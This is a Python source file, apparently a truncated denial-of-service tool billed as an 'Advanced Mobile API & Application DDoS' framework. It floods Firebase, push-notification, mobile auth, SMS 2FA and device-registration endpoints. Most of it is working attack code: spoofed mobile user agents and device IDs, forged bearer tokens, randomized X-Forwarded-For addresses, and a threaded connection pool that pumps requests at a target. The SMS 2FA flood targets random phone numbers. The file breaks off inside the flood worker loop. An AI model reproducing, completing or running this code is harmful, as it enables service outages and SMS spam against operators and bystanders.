#!/usr/bin/env python3
"""
Advanced Mobile API & Application DDoS
Multi-Threaded Mobile-Specific Attack Framework
Targets: Firebase, Mobile APIs, Push Notifications, Deep Links, Mobile Backend Services
"""

import socket
import ssl
import threading
import random
import time
import sys
import os
import struct
import hashlib
import hmac
import base64
import json
import queue
import signal
import traceback
import ipaddress
import re
import http.client
import urllib.parse
import urllib.request
from concurrent.futures import ThreadPoolExecutor, ProcessPoolExecutor, as_completed
from collections import defaultdict, deque
from datetime import datetime, timedelta
from enum import Enum
from dataclasses import dataclass, field
from typing import List, Dict, Optional, Tuple, Any
import logging
from logging.handlers import RotatingFileHandler
import zlib
import gzip
from io import BytesIO
import uuid

# ==================== CONFIGURATION ====================
@dataclass
class MobileEngineConfig:
    debug: bool = False
    log_file: str = "mobile_ddos.log"
    max_log_size: int = 50 * 1024 * 1024
    backup_count: int = 10
    stealth_mode: bool = False
    adaptive_mode: bool = True
    verify_ssl: bool = False
    timeout: int = 30
    retry_count: int = 3
    jitter: float = 0.1
    firebase_url: str = ""
    firebase_api_key: str = ""
    fcm_server_key: str = ""
    apns_cert_path: str = ""
    mobile_user_agents: bool = True
    device_id_spoofing: bool = True
    push_notification_flood: bool = False

config = MobileEngineConfig()

# ==================== LOGGING ====================
def setup_logging():
    logger = logging.getLogger('MOBILE_DDOS')
    logger.setLevel(logging.DEBUG if config.debug else logging.INFO)
    
    formatter = logging.Formatter(
        '%(asctime)s - [%(levelname)s] - %(threadName)s - %(funcName)s - %(message)s',
        datefmt='%Y-%m-%d %H:%M:%S'
    )
    
    file_handler = RotatingFileHandler(
        config.log_file, 
        maxBytes=config.max_log_size,
        backupCount=config.backup_count
    )
    file_handler.setLevel(logging.DEBUG)
    file_handler.setFormatter(formatter)
    
    console_handler = logging.StreamHandler(sys.stdout)
    console_handler.setLevel(logging.INFO)
    console_handler.setFormatter(logging.Formatter('%(asctime)s - %(message)s', datefmt='%H:%M:%S'))
    
    logger.addHandler(file_handler)
    logger.addHandler(console_handler)
    
    return logger

logger = setup_logging()

# ==================== ENUMS ====================
class MobileAttackVector(Enum):
    FIREBASE_FLOOD = "firebase_flood"
    FCM_FLOOD = "fcm_flood"
    APNS_FLOOD = "apns_flood"
    MOBILE_API_FLOOD = "mobile_api_flood"
    DEEP_LINK_FLOOD = "deep_link_flood"
    QR_GENERATION_FLOOD = "qr_generation_flood"
    SMS_2FA_FLOOD = "sms_2fa_flood"
    AUTH_REFRESH_FLOOD = "auth_refresh_flood"
    JWT_REFRESH_FLOOD = "jwt_refresh_flood"
    OAUTH_MOBILE_FLOOD = "oauth_mobile_flood"
    SESSION_CREATION_FLOOD = "session_creation_flood"
    DEVICE_REGISTRATION_FLOOD = "device_registration_flood"
    MOBILE_GRAPHQL_FLOOD = "mobile_graphql_flood"
    MOBILE_REST_FLOOD = "mobile_rest_flood"
    PUSH_SUBSCRIPTION_FLOOD = "push_subscription_flood"
    MOBILE_DATABASE_FLOOD = "mobile_database_flood"
    MOBILE_STORAGE_FLOOD = "mobile_storage_flood"
    MOBILE_SYNC_FLOOD = "mobile_sync_flood"
    MIXED_MOBILE = "mixed_mobile"

class MobilePlatform(Enum):
    ANDROID = "android"
    IOS = "ios"
    REACT_NATIVE = "react_native"
    FLUTTER = "flutter"
    XAMARIN = "xamarin"
    IONIC = "ionic"
    UNITY = "unity"
    PWA = "pwa"

# ==================== MOBILE PAYLOAD DATABASE ====================
class MobilePayloadDatabase:
    def __init__(self):
        self._init_user_agents()
        self._init_device_ids()
        self._init_mobile_endpoints()
        self._init_firebase_paths()
        self._init_fcm_payloads()
        self._init_apns_payloads()
        self._init_deep_link_schemes()
        self._init_mobile_auth_tokens()
        
    def _init_user_agents(self):
        self.android_user_agents = [
            # Samsung Galaxy S23 Ultra
            "Dalvik/2.1.0 (Linux; U; Android 14; SM-S918B Build/UP1A.231005.007)",
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            # Google Pixel 8 Pro
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            # OnePlus 11
            "Mozilla/5.0 (Linux; Android 14; PHB110) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            # Xiaomi 13 Pro
            "Mozilla/5.0 (Linux; Android 14; 2210132G) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            # Samsung Galaxy A54
            "Mozilla/5.0 (Linux; Android 14; SM-A546B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36",
            # Older Android devices
            "Mozilla/5.0 (Linux; Android 13; SM-G998B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.6045.163 Mobile Safari/537.36",
            "Mozilla/5.0 (Linux; Android 12; SM-F926B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.5993.111 Mobile Safari/537.36",
            # Android WebView
            "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro Build/UQ1A.231205.015; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36",
            # Facebook App
            "Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 [FB_IAB/FB4A;FBAV/445.0.0.30.118;]",
            # Instagram App
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 312.0.0.29.110",
            # TikTok
            "Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 musical_ly_32.6.3",
            # WhatsApp
            "WhatsApp/2.24.1.76 Android/14 Device/SM-S918B",
            # Telegram
            "Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 Telegram-Android/10.6.0",
            # Snapchat
            "Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/120.0.6099.144 Mobile Safari/537.36 Snapchat/12.63.0.42"
        ]
        
        self.ios_user_agents = [
            # iPhone 15 Pro Max
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            # iPhone 15
            "Mozilla/5.0 (iPhone15,4; U; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            # iPhone 14 Pro
            "Mozilla/5.0 (iPhone; CPU iPhone OS 16_7 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/16.6 Mobile/15E148 Safari/604.1",
            # iPad Pro
            "Mozilla/5.0 (iPad; CPU OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            # iPhone SE
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Mobile/15E148 Safari/604.1",
            # iOS Chrome
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) CriOS/120.0.6099.119 Mobile/15E148 Safari/604.1",
            # iOS Firefox
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) FxiOS/120.0 Mobile/15E148 Safari/605.1.15",
            # iOS Facebook
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBAV/445.0.0.30.118;FBBV/570588078;FBDV/iPhone15,3;FBMD/iPhone;FBSN/iOS;FBSV/17.2;FBSS/3;FBID/phone;FBLC/en_US;FBOP/5;FBRV/0]",
            # iOS Instagram
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Instagram 312.0.0.29.110 (iPhone15,3; iOS 17.2; en_US; en-US; scale=3.00; 1290x2796; 570588078)",
            # iOS TikTok
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 TikTok 32.6.3",
            # iOS Snapchat
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Snapchat/12.63.0.42"
        ]
        
        self.react_native_agents = [
            "Mozilla/5.0 (Linux; Android 14; SM-S918B Build/UP1A.231005.007; ReactNative) AppleWebKit/537.36",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X; ReactNative) AppleWebKit/605.1.15",
            "Expo/49.0.0 (Android 14; SM-S918B)",
            "Expo/49.0.0 (iOS 17.2; iPhone15,3)"
        ]
        
        self.flutter_agents = [
            "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.6099.144 Mobile Safari/537.36 Flutter/3.16.0",
            "Mozilla/5.0 (iPhone; CPU iPhone OS 17_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 Flutter/3.16.0"
        ]
    
    def _init_device_ids(self):
        self.android_ids = [
            hashlib.md5(f"android-{i}".encode()).hexdigest()[:16].upper()
            for i in range(100)
        ]
        
        self.ios_idfa = [
            str(uuid.UUID(int=random.getrandbits(128))).upper()
            for _ in range(100)
        ]
        
        self.ios_idfv = [
            str(uuid.UUID(int=random.getrandbits(128))).upper()
            for _ in range(100)
        ]
        
        self.advertising_ids = [
            str(uuid.UUID(int=random.getrandbits(128)))
            for _ in range(100)
        ]
        
        self.firebase_instance_ids = [
            f"f{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789-_', k=20))}"
            for _ in range(100)
        ]
        
        self.fcm_tokens = [
            f"{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_', k=152))}:APA91b{''.join(random.choices('abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_', k=134))}"
            for _ in range(50)
        ]
        
        self.apns_device_tokens = [
            ''.join(random.choices('0123456789abcdef', k=64))
            for _ in range(50)
        ]
    
    def _init_mobile_endpoints(self):
        self.mobile_api_endpoints = [
            # Authentication
            "/api/v1/auth/login",
            "/api/v1/auth/register",
            "/api/v1/auth/refresh",
            "/api/v1/auth/logout",
            "/api/v1/auth/verify",
            "/api/v1/auth/forgot-password",
            "/api/v1/auth/reset-password",
            "/api/v2/mobile/auth",
            "/oauth/token",
            "/oauth/authorize",
            "/connect/token",
            # User endpoints
            "/api/v1/user/profile",
            "/api/v1/user/settings",
            "/api/v1/user/preferences",
            "/api/v1/user/devices",
            "/api/v1/user/sessions",
            "/api/v1/user/notifications",
            "/api/v1/user/sync",
            # Data endpoints
            "/api/v1/data/sync",
            "/api/v1/data/upload",
            "/api/v1/data/download",
            "/api/v1/data/batch",
            "/api/v1/data/realtime",
            # Push notification
            "/api/v1/push/register",
            "/api/v1/push/unregister",
            "/api/v1/push/subscribe",
            "/api/v1/push/topics",
            # Deep links
            "/api/v1/deeplink/resolve",
            "/api/v1/deeplink/generate",
            "/api/v1/links",
            # Firebase specific
            "/.json",
            "/firebase/realtime.json",
            "/firestore/document",
            # Mobile specific
            "/api/v1/mobile/config",
            "/api/v1/mobile/version",
            "/api/v1/mobile/force-update",
            "/api/mobile/health",
            # Social login
            "/api/v1/auth/google",
            "/api/v1/auth/facebook",
            "/api/v1/auth/apple",
            "/api/v1/auth/twitter",
            "/api/v1/auth/phone",
            # In-app purchases
            "/api/v1/purchases/verify",
            "/api/v1/purchases/receipt",
            "/api/v1/subscriptions/verify",
            # Analytics
            "/api/v1/analytics/event",
            "/api/v1/analytics/screen",
            "/api/v1/analytics/batch",
            # Crash reporting
            "/api/v1/crash/report",
            "/api/v1/logs/batch",
            "/api/v1/errors/report",
            # Storage
            "/api/v1/storage/upload",
            "/api/v1/storage/download",
            "/api/v1/files/upload",
            "/api/v1/media/upload",
            # Chat
            "/api/v1/chat/messages",
            "/api/v1/chat/rooms",
            "/api/v1/chat/send",
            # Location
            "/api/v1/location/update",
            "/api/v1/geolocation",
            "/api/v1/places/search",
            # Payment
            "/api/v1/payment/intent",
            "/api/v1/payment/process",
            "/api/v1/payment/verify"
        ]
    
    def _init_firebase_paths(self):
        self.firebase_paths = [
            "/users",
            "/users/{userId}/profile",
            "/users/{userId}/settings",
            "/users/{userId}/devices",
            "/users/{userId}/sessions",
            "/users/{userId}/notifications",
            "/users/{userId}/messages",
            "/users/{userId}/posts",
            "/users/{userId}/followers",
            "/users/{userId}/following",
            "/posts",
            "/posts/{postId}/comments",
            "/posts/{postId}/likes",
            "/chat/{chatId}/messages",
            "/realtime/data",
            "/realtime/events",
            "/realtime/status",
            "/sync/data",
            "/sync/timestamp",
            "/firestore/users",
            "/firestore/messages",
            "/firestore/events",
            "/analytics/events",
            "/analytics/screens",
            "/config",
            "/config/remote",
            "/config/features",
            "/crashlytics/reports",
            "/performance/traces"
        ]
    
    def _init_fcm_payloads(self):
        self.fcm_notification_payloads = [
            {
                "to": None,  # Will be filled with token
                "notification": {
                    "title": "New Message",
                    "body": "You have a new message from User",
                    "sound": "default",
                    "badge": "1",
                    "click_action": "OPEN_ACTIVITY",
                    "icon": "ic_notification",
                    "color": "#FF5733",
                    "tag": "new_message",
                    "channel_id": "default_channel"
                },
                "data": {
                    "type": "message",
                    "sender_id": "user_123",
                    "message_id": "msg_456",
                    "room_id": "room_789",
                    "timestamp": str(int(time.time()))
                },
                "priority": "high",
                "ttl": "86400s",
                "collapse_key": "new_message"
            },
            {
                "to": None,
                "notification": {
                    "title": "New Follower",
                    "body": "Someone started following you!",
                    "sound": "default",
                    "badge": "1",
                    "click_action": "OPEN_PROFILE"
                },
                "data": {
                    "type": "follow",
                    "follower_id": "user_456"
                },
                "priority": "normal"
            },
            {
                "to": None,
                "data": {
                    "type": "sync",
                    "payload": json.dumps({"sync_type": "full", "tables": ["users", "messages", "settings"]}),
                    "urgent": "true"
                },
                "priority": "high",
                "collapse_key": "sync_data"
            }
        ]
    
    def _init_apns_payloads(self):
        self.apns_payloads = [
            {
                "aps": {
                    "alert": {
                        "title": "New Message",
                        "subtitle": "From: User",
                        "body": "You have received a new message"
                    },
                    "badge": 1,
                    "sound": "default",
                    "content-available": 1,
                    "mutable-content": 1,
                    "category": "MESSAGE"
                },
                "data": {
                    "type": "message",
                    "message_id": "msg_456"
                }
            },
            {
                "aps": {
                    "alert": "New update available",
                    "badge": 0,
                    "sound": "default",
                    "content-available": 1
                },
                "data": {
                    "type": "sync",
                    "sync_type": "incremental"
                }
            }
        ]
    
    def _init_deep_link_schemes(self):
        self.deep_link_schemes = [
            "myapp://",
            "myapp://home",
            "myapp://profile/{userId}",
            "myapp://post/{postId}",
            "myapp://chat/{roomId}",
            "myapp://settings",
            "myapp://search?q=test",
            "myapp://payment?id=123",
            "myapp://verify?token=abc",
            "myapp://reset?code=xyz",
            "https://app.example.com",
            "https://app.example.com/deeplink",
            "https://link.example.com",
            "fb123456789://",
            "instagram://",
            "twitter://",
            "whatsapp://",
            "telegram://",
            "snapchat://",
            "tiktok://"
        ]
    
    def _init_mobile_auth_tokens(self):
        self.bearer_tokens = [
            self._generate_jwt() for _ in range(20)
        ]
        
        self.refresh_tokens = [
            hashlib.sha256(f"refresh-{i}-{time.time()}".encode()).hexdigest()
            for i in range(20)
        ]
        
        self.api_keys = [
            hashlib.md5(f"api-key-{i}-mobile".encode()).hexdigest()
            for i in range(20)
        ]
    
    def _generate_jwt(self):
        header = base64.urlsafe_b64encode(json.dumps({
            "alg": "RS256",
            "typ": "JWT",
            "kid": f"mobile-key-{random.randint(1,10)}"
        }).encode()).decode().rstrip("=")
        
        payload = base64.urlsafe_b64encode(json.dumps({
            "sub": str(uuid.uuid4()),
            "iss": "mobile-app",
            "aud": "mobile-api",
            "iat": int(time.time()),
            "exp": int(time.time()) + 3600,
            "platform": random.choice(["android", "ios"]),
            "device_id": random.choice(self.android_ids + self.ios_idfv),
            "app_version": f"{random.randint(1,5)}.{random.randint(0,99)}.{random.randint(0,999)}"
        }).encode()).decode().rstrip("=")
        
        signature = base64.urlsafe_b64encode(
            hashlib.sha256(f"{header}.{payload}".encode()).digest()
        ).decode().rstrip("=")
        
        return f"{header}.{payload}.{signature}"
    
    def random_string(self, length=10):
        return ''.join(random.choices('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789', k=length))
    
    def random_ip(self):
        return f"{random.randint(1,255)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,255)}"
    
    def generate_device_info(self, platform=MobilePlatform.ANDROID):
        if platform == MobilePlatform.ANDROID:
            return {
                "platform": "android",
                "os_version": random.choice(["14", "13", "12", "11"]),
                "device_model": random.choice([
                    "SM-S918B", "Pixel 8 Pro", "PHB110", "2210132G",
                    "SM-A546B", "SM-G998B", "SM-F926B", "SM-G991B"
                ]),
                "device_id": random.choice(self.android_ids),
                "advertising_id": random.choice(self.advertising_ids),
                "firebase_instance_id": random.choice(self.firebase_instance_ids),
                "app_version": f"{random.randint(1,5)}.{random.randint(0,99)}.{random.randint(0,999)}",
                "app_build": str(random.randint(1, 9999)),
                "screen_width": random.choice([1080, 1440, 2340]),
                "screen_height": random.choice([1920, 2340, 3088]),
                "density": random.choice([420, 480, 560, 640]),
                "language": random.choice(["en", "es", "fr", "de", "zh", "ja", "ko", "ru"]),
                "timezone": random.choice(["UTC", "America/New_York", "Europe/London", "Asia/Tokyo"]),
                "carrier": random.choice(["Verizon", "AT&T", "T-Mobile", "Vodafone", "Orange", "Telefonica"])
            }
        elif platform == MobilePlatform.IOS:
            return {
                "platform": "ios",
                "os_version": random.choice(["17.2", "17.1", "16.7", "16.6", "15.8"]),
                "device_model": random.choice([
                    "iPhone15,3", "iPhone15,4", "iPhone14,7", "iPhone14,8",
                    "iPhone13,3", "iPad13,8", "iPad14,1"
                ]),
                "idfa": random.choice(self.ios_idfa),
                "idfv": random.choice(self.ios_idfv),
                "apns_token": random.choice(self.apns_device_tokens),
                "app_version": f"{random.randint(1,5)}.{random.randint(0,99)}.{random.randint(0,999)}",
                "app_build": str(random.randint(1, 9999)),
                "screen_width": random.choice([1170, 1179, 1284]),
                "screen_height": random.choice([2532, 2556, 2778]),
                "scale": "3.00",
                "language": random.choice(["en", "es", "fr", "de", "zh", "ja", "ko", "ru"]),
                "timezone": random.choice(["UTC", "America/New_York", "Europe/London", "Asia/Tokyo"])
            }
        else:
            return self.generate_device_info(MobilePlatform.ANDROID)

# ==================== MOBILE REQUEST BUILDER ====================
class MobileRequestBuilder:
    def __init__(self, target_host, target_port, use_ssl=False):
        self.target_host = target_host
        self.target_port = target_port
        self.use_ssl = use_ssl
        self.payload_db = MobilePayloadDatabase()
    
    def build_mobile_headers(self, platform=MobilePlatform.ANDROID):
        device_info = self.payload_db.generate_device_info(platform)
        
        headers = {
            "Host": self.target_host if self.target_port in [80, 443] else f"{self.target_host}:{self.target_port}",
            "User-Agent": random.choice(
                self.payload_db.android_user_agents if platform == MobilePlatform.ANDROID 
                else self.payload_db.ios_user_agents
            ),
            "Accept": "application/json",
            "Accept-Encoding": "gzip, deflate, br",
            "Accept-Language": device_info["language"],
            "X-Platform": device_info["platform"],
            "X-OS-Version": device_info["os_version"],
            "X-Device-Model": device_info["device_model"],
            "X-App-Version": device_info["app_version"],
            "X-App-Build": device_info["app_build"],
            "X-Device-ID": device_info.get("device_id", device_info.get("idfv", "")),
            "X-Advertising-ID": device_info.get("advertising_id", device_info.get("idfa", "")),
            "X-Screen-Width": str(device_info["screen_width"]),
            "X-Screen-Height": str(device_info["screen_height"]),
            "X-Timezone": device_info["timezone"],
            "X-Request-ID": str(uuid.uuid4()),
            "Authorization": f"Bearer {random.choice(self.payload_db.bearer_tokens)}",
            "X-Forwarded-For": self.payload_db.random_ip(),
            "X-Real-IP": self.payload_db.random_ip(),
        }
        
        if config.device_id_spoofing:
            headers["X-Firebase-Instance-ID"] = device_info.get("firebase_instance_id", "")
            headers["X-FCM-Token"] = random.choice(self.payload_db.fcm_tokens)
        
        return headers
    
    def build_mobile_rest_request(self, method, path, body=None, platform=None):
        if not platform:
            platform = random.choice([MobilePlatform.ANDROID, MobilePlatform.IOS])
        
        headers = self.build_mobile_headers(platform)
        
        if body:
            if isinstance(body, dict):
                body = json.dumps(body)
            headers["Content-Type"] = "application/json"
            headers["Content-Length"] = str(len(body))
        
        request_line = f"{method} {path} HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        request = f"{request_line}{header_lines}\r\n\r\n"
        if body:
            request += body
        
        return request.encode()
    
    def build_firebase_request(self, path, method="GET", data=None):
        headers = self.build_mobile_headers(MobilePlatform.ANDROID)
        headers["Host"] = self.target_host if self.target_port in [80, 443] else f"{self.target_host}:{self.target_port}"
        
        if data:
            body = json.dumps(data)
            headers["Content-Type"] = "application/json"
            headers["Content-Length"] = str(len(body))
        else:
            body = None
        
        request_line = f"{method} {path} HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        request = f"{request_line}{header_lines}\r\n\r\n"
        if body:
            request += body
        
        return request.encode()
    
    def build_fcm_request(self, fcm_token=None):
        if not fcm_token:
            fcm_token = random.choice(self.payload_db.fcm_tokens)
        
        payload = random.choice(self.payload_db.fcm_notification_payloads).copy()
        payload["to"] = fcm_token
        
        body = json.dumps(payload)
        
        headers = {
            "Host": self.target_host if self.target_port in [80, 443] else f"{self.target_host}:{self.target_port}",
            "Authorization": f"key={config.fcm_server_key or self.payload_db.random_string(40)}",
            "Content-Type": "application/json",
            "Content-Length": str(len(body))
        }
        
        request_line = f"POST /fcm/send HTTP/1.1\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        return f"{request_line}{header_lines}\r\n\r\n{body}".encode()
    
    def build_apns_request(self, device_token=None):
        if not device_token:
            device_token = random.choice(self.payload_db.apns_device_tokens)
        
        payload = json.dumps(random.choice(self.payload_db.apns_payloads))
        
        headers = {
            "Host": self.target_host,
            "apns-topic": "com.example.app",
            "apns-priority": "10",
            "apns-push-type": random.choice(["alert", "background", "voip"]),
            "apns-expiration": "0",
            "apns-collapse-id": str(uuid.uuid4()),
            "Content-Length": str(len(payload))
        }
        
        request_line = f"POST /3/device/{device_token} HTTP/2\r\n"
        header_lines = "\r\n".join([f"{k}: {v}" for k, v in headers.items()])
        
        return f"{request_line}{header_lines}\r\n\r\n{payload}".encode()
    
    def build_deep_link_request(self):
        scheme = random.choice(self.payload_db.deep_link_schemes)
        scheme = scheme.replace("{userId}", self.payload_db.random_string(8))
        scheme = scheme.replace("{postId}", self.payload_db.random_string(8))
        scheme = scheme.replace("{roomId}", self.payload_db.random_string(8))
        
        body = json.dumps({
            "url": scheme,
            "platform": random.choice(["android", "ios"]),
            "fallback_url": f"https://app.example.com/fallback?url={urllib.parse.quote(scheme)}"
        })
        
        return self.build_mobile_rest_request("POST", "/api/v1/deeplink/resolve", body)
    
    def build_device_registration_request(self):
        device_info = self.payload_db.generate_device_info(
            random.choice([MobilePlatform.ANDROID, MobilePlatform.IOS])
        )
        
        body = {
            "device": device_info,
            "push_token": random.choice(
                self.payload_db.fcm_tokens if device_info["platform"] == "android" 
                else self.payload_db.apns_device_tokens
            ),
            "push_provider": "fcm" if device_info["platform"] == "android" else "apns",
            "locale": device_info["language"],
            "timezone": device_info["timezone"]
        }
        
        return self.build_mobile_rest_request("POST", "/api/v1/devices", body)
    
    def build_auth_refresh_request(self):
        body = {
            "refresh_token": random.choice(self.payload_db.refresh_tokens),
            "grant_type": "refresh_token",
            "client_id": f"mobile_app_{random.choice(['android', 'ios'])}",
            "client_secret": self.payload_db.random_string(32),
            "scope": "read write offline_access"
        }
        
        return self.build_mobile_rest_request("POST", "/oauth/token", body)
    
    def build_sms_2fa_request(self):
        body = {
            "phone_number": f"+1{random.randint(200, 999)}{random.randint(100, 999)}{random.randint(1000, 9999)}",
            "method": "sms",
            "purpose": random.choice(["login", "register", "verify", "reset_password"]),
            "platform": random.choice(["android", "ios"]),
            "device_id": random.choice(self.payload_db.android_ids + self.payload_db.ios_idfv)
        }
        
        return self.build_mobile_rest_request("POST", "/api/v1/auth/2fa/send", body)

# ==================== CONNECTION MANAGER ====================
class MobileConnectionManager:
    def __init__(self, host, port, use_ssl=False, pool_size=100):
        self.host = host
        self.port = port
        self.use_ssl = use_ssl
        self.pool_size = pool_size
        self.pool = queue.Queue(maxsize=pool_size)
        self.lock = threading.Lock()
        self.created = 0
        
    def create_connection(self):
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            sock.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
            sock.settimeout(config.timeout)
            sock.connect((self.host, self.port))
            
            if self.use_ssl:
                context = ssl.create_default_context()
                context.check_hostname = config.verify_ssl
                context.verify_mode = ssl.CERT_REQUIRED if config.verify_ssl else ssl.CERT_NONE
                sock = context.wrap_socket(sock, server_hostname=self.host)
            
            with self.lock:
                self.created += 1
            
            return sock
        except Exception as e:
            logger.debug(f"Mobile connection creation failed: {e}")
            return None
    
    def get_connection(self):
        try:
            return self.pool.get_nowait()
        except queue.Empty:
            if self.created < self.pool_size:
                return self.create_connection()
            return None
    
    def return_connection(self, conn):
        if conn:
            try:
                self.pool.put_nowait(conn)
            except queue.Full:
                try:
                    conn.close()
                except:
                    pass
                with self.lock:
                    self.created -= 1
    
    def close_all(self):
        while not self.pool.empty():
            try:
                conn = self.pool.get_nowait()
                conn.close()
            except:
                pass

# ==================== STATISTICS ====================
class MobileStatistics:
    def __init__(self):
        self.stats = defaultdict(int)
        self.lock = threading.Lock()
        self.start_time = time.time()
        self.response_times = deque(maxlen=10000)
        self.http_codes = defaultdict(int)
        self.platform_stats = defaultdict(int)
        
    def record_success(self, vector, platform=None, response_time=None, status_code=None):
        with self.lock:
            self.stats[f'{vector}_success'] += 1
            self.stats['total_success'] += 1
            if response_time:
                self.response_times.append(response_time)
            if status_code:
                self.http_codes[str(status_code)] += 1
            if platform:
                self.platform_stats[f'{platform}_success'] += 1
    
    def record_failure(self, vector, error_type, platform=None):
        with self.lock:
            self.stats[f'{vector}_failure'] += 1
            self.stats['total_failure'] += 1
            self.stats[f'error_{error_type}'] += 1
            if platform:
                self.platform_stats[f'{platform}_failure'] += 1
    
    def get_summary(self):
        with self.lock:
            elapsed = time.time() - self.start_time
            total = self.stats['total_success'] + self.stats['total_failure']
            rate = total / elapsed if elapsed > 0 else 0
            
            avg_rt = 0
            if self.response_times:
                avg_rt = sum(self.response_times) / len(self.response_times)
            
            return {
                'elapsed': elapsed,
                'total_requests': total,
                'successful': self.stats['total_success'],
                'failed': self.stats['total_failure'],
                'rate': rate,
                'avg_response_time': avg_rt,
                'http_codes': dict(self.http_codes),
                'platform_stats': dict(self.platform_stats)
            }

# ==================== MOBILE ATTACK EXECUTOR ====================
class MobileAttackExecutor:
    def __init__(self, target, port, use_ssl=False, threads=500, duration=60):
        self.target = target
        self.port = port
        self.use_ssl = use_ssl
        self.threads = threads
        self.duration = duration
        self.running = True
        self.stats = MobileStatistics()
        self.connection_pool = MobileConnectionManager(target, port, use_ssl, pool_size=threads)
        self.request_builder = MobileRequestBuilder(target, port, use_ssl)
        
    def _send_and_receive(self, sock, request, timeout=5):
        try:
            sock.settimeout(timeout)
            start = time.time()
            sock.sendall(request)
            
            response = b""
            while True:
                try:
                    chunk = sock.recv(4096)
                    if not chunk:
                        break
                    response += chunk
                    if len(response) > 65536:
                        break
                except socket.timeout:
                    break
            
            response_time = time.time() - start
            
            status_code = None
            try:
                status_line = response.split(b'\r\n')[0].decode()
                status_code = int(status_line.split(' ')[1])
            except:
                pass
            
            return True, response_time, status_code, len(response)
        except Exception as e:
            return False, 0, None, 0
    
    def _test_target(self):
        logger.info(f"[*] Testing mobile API target: {self.target}:{self.port}")
        
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(5)
            result = sock.connect_ex((self.target, self.port))
            sock.close()
            
            if result == 0:
                logger.info(f"[+] Target reachable")
                return True
            else:
                logger.error(f"[-] Target NOT reachable")
                return False
        except Exception as e:
            logger.error(f"[-] Test failed: {e}")
            return False
    
    def _mobile_api_flood_worker(self, thread_id):
        consecutive_errors = 0
        max_errors = 50
        
        while self.running and consecutive_errors < max_errors:
            try:
                conn = self.connection_pool.get_connection()
                if not conn:
                    conn = self.connection_pool.create_connection()
                
                if not conn:
                    time.sleep(0.01)
                    continue
                
                for _ in range(random.randint(1, 20)):
                    if not self.running:
                        break
                    
